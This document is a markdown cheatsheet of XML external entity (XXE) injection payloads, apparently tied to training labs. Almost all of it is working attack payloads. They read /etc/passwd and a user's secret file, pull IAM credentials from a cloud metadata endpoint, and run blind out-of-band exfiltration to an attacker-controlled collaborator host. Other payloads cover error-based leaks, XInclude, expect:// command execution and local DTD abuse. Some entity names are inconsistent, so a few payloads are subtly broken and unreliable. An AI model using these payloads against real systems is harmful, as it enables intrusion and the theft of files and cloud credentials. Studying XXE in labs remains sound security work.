# XML / XXE ENTITIES INJECTION - CHEATSHEET + LABS

## Key Terms
```bash
- DTD (Document Type Definition)
- General External Entity (external) = outside the DTD
- Parameter Entity (internal) = inside the DTD

# General external entity: the entity is declared inside the DTD but referenced from outside
<!DOCTYPE foo [ <!ENTITY  xxe SYSTEM "http://<IP>">  ]>
<userInfo>
    <firstName> %xxe; </firstName>
</userInfo>
#---------#
# External parameter entities: declared and invoked (expanded) inside the DTD itself
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "/etc/passwd"> %xxe; ]>
```
## Walkthrough - Most Important Labs

- [CHEATSHEET](#cheatsheet)
- [BLIND XXE EXTERNAL DTD](#blind-xxe-external-dtd)
- [BLIND XXE ERROR BASED MESSAGE](#blind-xxe-error-based-messages)
- [XXE INCLUDE](#xxe-include)
- [XXE DTD LOCAL](#xxe-dtd-local)

<br>


## CHEATSHEET
```bash
<!DOCTYPE foo [ <!ENTITY xxe-entity "test" > ]>
<!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "/etc/passwd" > ]>
<!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "file:///etc/passwd" > ]>  
<!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "file:///home/carlos/secret" > ]>  
<!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "https://example.com/archivo.txt" > ]>
<!DOCTYPE foo [ <!ENTITY xxe-entity SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" > ]> # Directory listing
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://<BURP-COLLAB>"> ]> # DNS lookup
<!DOCTYPE foo [ <!ENTITY % xxe-entity SYSTEM "file:///etc/passwd" > %xee ]> # Parameter Entity
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1 #XINCLUDE
```

#### BLIND-XXE-EXTERNAL-DTD
```bash
<!DOCTYPE foo [<!ENTITY % xxe-entity SYSTEM "https://<EXPLOIT-SV>/"> %xee;]>

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<BURP-COLLAB/?content=%file;'>"> # &#x25 = % in hexadecimal so it is treated as text
%eval;
%exfil;
```

#### BLIND-XXE-ERROR-BASED-MESSAGES
```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///ERROR/%file;' >">
%eval;
%exfil;
```
#### XXE-INCLUDE
```bash
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>

```
```bash
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
#### XXE-DTD-LOCAL
> /usr/share/yelp/dtd/docbookx.dtd is a local DTD found in > GNOME environments
> Important: represent certain characters in hexadecimal`
```bash
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file:///ERROR/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;exfil;
'> 
%local_dtd;
]>
```
